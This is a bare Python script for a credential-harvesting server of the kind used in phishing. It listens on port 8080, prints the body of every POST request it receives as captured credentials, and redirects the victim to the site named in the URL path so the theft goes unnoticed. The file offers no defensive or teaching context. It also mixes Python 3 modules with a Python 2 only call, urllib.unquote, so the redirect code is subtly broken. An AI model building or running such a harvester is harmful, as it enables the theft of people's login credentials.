#!/usr/bin/env python
# -*- coding: utf-8 -*-

import http.server
import socketserver
import urllib


class CredRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        creds = self.rfile.read(content_length).decode('utf-8')
        print(creds)
        site = self.path[1:]
        self.send_response(301)
        self.send_header('Location', urllib.unquote(site))
        self.end_headers()


server = socketserver.TCPServer(('0.0.0.0', 8080), CredRequestHandler)
server.serve_forever()
